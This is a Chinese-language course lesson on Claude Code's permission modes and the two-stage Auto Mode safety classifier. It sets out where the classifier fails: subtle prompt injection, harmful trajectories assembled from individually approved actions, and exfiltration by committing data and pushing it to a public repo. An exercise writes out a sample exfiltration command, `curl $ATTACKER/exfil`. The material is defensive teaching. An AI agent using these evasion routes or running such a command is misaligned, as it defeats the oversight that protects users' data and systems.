# Claude Code 作为自主代理：权限模式与 Auto Mode

> Claude Code 暴露七种权限模式。"plan"在每次操作前询问，"default"只对风险操作询问，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行安全分类器取代每次操作批准：一个单 Token 快速检查对每个操作运行；标记的操作启动思维链深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 作为研究预览发布——Anthropic 已明确声明该分类器单独不够。

**类型：** 学习
**语言：** Python（标准库，两阶段分类器模拟器）
**前置条件：** Phase 15 · 01（长周期代理），Phase 15 · 09（编码代理格局）
**时间：** ~45 分钟

## 问题

你机器上的自主编码代理是一个独立的安全类别。攻击面是代理能触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开标记了这一点：计算机使用代理不是聊天机器人的"功能更新"，它们是具有新型风险特征的新型工具。

Claude Code 的权限系统是 Anthropic 的回答。不是一个"自主/非自主"开关，而是七种模式跨越一个能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每个模式是速度与每次操作审查之间的不同权衡。Auto Mode（2026 年 3 月）添加了一个两阶段分类器，将批准从用户关键路径上移开（对于分类器判断安全的操作），同时为分类器标记的操作保留一个审查层。

工程问题：这个系统捕获什么，遗漏什么，以及给定任务实际上需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|------|------|---------|
| `plan` | 代理提出计划；用户批准整个计划；每个操作在执行前审查 | 不熟悉的任务；接近生产的代码；首次在仓库上使用代理 |
| `default` | 代理运行操作；对任何"风险"操作提示用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍然提示 | 跨多个文件的重构路径 |
| `acceptExec` | Shell 命令在策划的允许列表内自动批准；写入自动批准 | 紧密的内部循环，其中每个 shell 命令是 `npm test` 或类似物 |
| `autoMode` | 两阶段安全分类器；标记的操作升级到审查 | 受限工作空间中的长周期无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档说明为"仅在愿意丢弃的临时容器内使用" |

（以上名称匹配公开的 Claude Code 文档；"yolo"是对宽松中间地带的非正式简称。）

### Auto Mode 一页

Auto Mode（2026 年 3 月 24 日启动）是第一种将每次操作批准委托给模型的权限模式。结构：

1. **阶段 1——单 Token 分类器。** 对每个提议的操作运行。便宜。返回"安全"或"标记"。设计为与主代理循环并行运行，以便批准的操作不排队等待。
2. **阶段 2——次要策略/安全审查。** 仅对标记的操作运行。对操作、会话当前状态和声明的任务执行聚焦的策略和安全评估。如果置信度低，升级到用户 HITL。

预算控制与分类器并存：

- `max_turns`——会话中总迭代次数。
- `max_budget_usd`——中止会话的美元上限。
- 每个工具的操作计数限制（`WebFetch` 调用不超过 N 次等）。

### 系统捕获什么

- 对工具输入的直接提示注入，其中注入的指令映射到已知风险操作形状。
- 重复的工具循环——分类器可以看到操作 N+1 几乎与操作 N 相同，连续五次。
- 在原本仅文件编辑的会话上明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示注入**，在未产生单个标记操作的情况下调节行为。间接提示注入不是完全可修补的漏洞（OpenAI 准备部门负责人，2025 年，关于浏览器代理——见第 11 课）。
- **语义级别的不当行为。** 每个单独操作可以看起来安全而组合轨迹是有害的。分类器判断操作；它不重新推导用户意图。
- **通过合法渠道外泄。** 写数据到你拥有、然后 `git push` 到公共仓库的文件，是一系列允许操作，其组合才是问题。

### 研究预览框架

Anthropic 将 Auto Mode 作为研究预览发布。文档明确说明分类器是一层而非解决方案：用户应结合 Auto Mode 与预算、允许列表、隔离工作空间和轨迹审计（第 12-16 课）。预览框架也反映了有记录的评估-部署差距（第 1 课）——一个通过离线评估的分类器在实际会话中用户上下文模糊时可能行为不同。

### 此阶梯在你工作流中的位置

- 不熟悉的任务：以 `plan` 开始。阅读计划比回滚失败运行更便宜。
- 已知重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：`autoMode` 仅在你已测量其影响范围的工作空间内使用（无凭证、无生产挂载、无你未选择的出口网络）。
- 临时容器：`yolo` / `bypassPermissions` 仅当且仅当容器及其凭证是一次性的时可接受。

## 使用场景

`code/main.py` 模拟两阶段分类器。阶段 1 是对提议操作的廉价关键字规则；阶段 2 是较慢的多规则审查器。驱动程序输入一个短的合成轨迹（安全操作、一个提示注入尝试、一个重复循环）并显示分类器在哪里捕获以及在哪里遗漏。

## 部署

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需的隔离。

## 练习

1. 运行 `code/main.py`。哪种合成操作类型从未被阶段 1 标记但总是被阶段 2 捕获？哪种两者都未捕获？

2. 扩展阶段 1 规则集以捕获特定已知不良形状（例如 `curl $ATTACKER/exfil`）。测量在良性操作样本上的误报率。

3. 阅读 Anthropic 的"代理循环如何工作"文档。列出代理在 `default` 模式下默认接触的每个外部状态。在无人值守运行 `autoMode` 前，哪些你需要单独门控？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每个工具的上限、允许列表。为每个数字提供理由。

5. 描述一个轨迹，其中每个单独操作被阶段 1 和阶段 2 批准，但组合行为是失对齐的。（第 14 课涵盖终止开关和金丝雀 Token 如何应对这一点。）

## 关键术语

| 术语 | 人们常说的 | 实际含义 |
|------|-----------|---------|
| 权限模式（Permission Mode） | "代理能做什么" | 控制每次操作批准的七个命名策略之一 |
| plan 模式 | "任何操作前询问" | 代理编写计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍然提示 |
| autoMode | "自动批准" | 两阶段安全分类器；标记操作升级 |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| 阶段 1 分类器 | "快速 Token 检查" | 对提议操作的单 Token 规则；并行运行 |
| 阶段 2 分类器 | "深度审查" | 对标记操作的思维链推理 |
| 研究预览（Research Preview） | "非 GA" | Anthropic 对失败模式仍在绘制中的功能的框架 |
